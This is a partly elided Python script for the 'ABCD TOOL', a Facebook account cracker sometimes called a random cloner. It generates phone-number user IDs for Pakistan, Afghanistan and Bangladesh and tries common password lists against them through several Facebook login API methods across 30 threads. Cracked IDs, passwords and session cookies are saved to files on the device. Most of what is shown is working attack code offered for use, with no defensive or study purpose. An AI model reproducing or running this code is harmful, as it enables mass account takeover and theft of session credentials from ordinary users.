...
def aprv():
    ...
    if k in r:
        main__manu()
        print("\033[1;32mYour Token is successfully Approved\33[1;37m")
    else:
                os.system('clear')
                print(logo)
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        ps_limit =1
                                clear()
                                print('\t\x1b[1;92m     ABCD TOOL PASSWORD MENU')
                                linex()
                                ...
                                clear()
                                print('\t\x1b[1;92m  ABCD TOOL ACCOUNTS DISPLAY MENU')
                                linex()
                                ...
                                print('\033[1;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/ABCD-COOKIE.txt') 
                                print('\033[1;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/ABCD-OK.txt')
                                linex()
                                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear();menu()
                        elif xd in ['2','02']:
                                clear()
                                print('\t\x1b[1;92m   ABCD TOOL RANDOM CLONING MENU')
                                linex()
                                ...
                                clear()
                                print('\t\x1b[1;92m   EXIT FROM ABCD TOOL')
                                linex()
                                input('\033[1;97m[•]\x1b[1;92m PRESS ENTER TO CONTACT OWNER ');clear() 
                                os.system('xdg-open https://www.facebook.com/veerkhano71');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE ABCD TOOL');time.sleep(2);linex();exit() 
                        else:
...
def pak():
                user=[]
                clear()
                print('\t\x1b[1;92m  ABCD TOOL PAK RANDOM CLONER MENU')
                linex()
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as ABCD:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;97mCode Teaches You How To Face Big Problems ! ')
                        print('\033[1;97mYour Mind Is Your Best Weapons ! ')
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khan123','khan12345','baloch123','baloch786','i love you','khankhan','baloch','khattak','khattak123','ali123','ali786','ABCD123']
                                ABCD.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                ...
                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/ABCD-rndm-COOKIE.txt') 
                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/ABCD-rndm-OK.txt')
                linex()
...
def afg():
                user=[]
                clear()
                print('\t\x1b[1;92m  ABCD TOOL AFG RANDOM CLONER MENU')
                linex()
...
def bd():
                user=[]
                clear()
                print('    \x1b[1;92mABCD TOOL BANGLADESH RANDOM  CLONER MENU')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[ABCD-M1]  %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ABCD=session.cookies.get_dict().keys()
                        if "c_user" in ABCD:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\x1b[1;97m[ABCD-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ABCD-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/ABCD-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ABCD:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m[ABCD-CP]  '+ids+' | '+pas+'\033[1;93m')
                                        open('/sdcard/ABCD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api4(self,uid,first,last):
        global loop,oks,cps
        sys.stdout.write('\\\33[1;35m [ABCD-M4] %s|OK/%s CP/%s\33[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in ABCD:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\\\33[1;32m [ABCD-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ABCD-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ABCD:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;97m[ABCD-CP]  '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ABCD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
...
def api(ids,names,passlist):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ABCD] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[ABCD-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/ABCD_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ABCD_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[ABCD-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ABCD_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ABCD-KING-M3] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m[HAPPY-ABCD-OK]  '+ids+' | '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/ABCD-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;97m [ABCD-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ABCD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ABCD-RANDOM] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/ABCD-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [ABCD-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/ABCD-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [HAPPY-ABCD-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ABCD-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
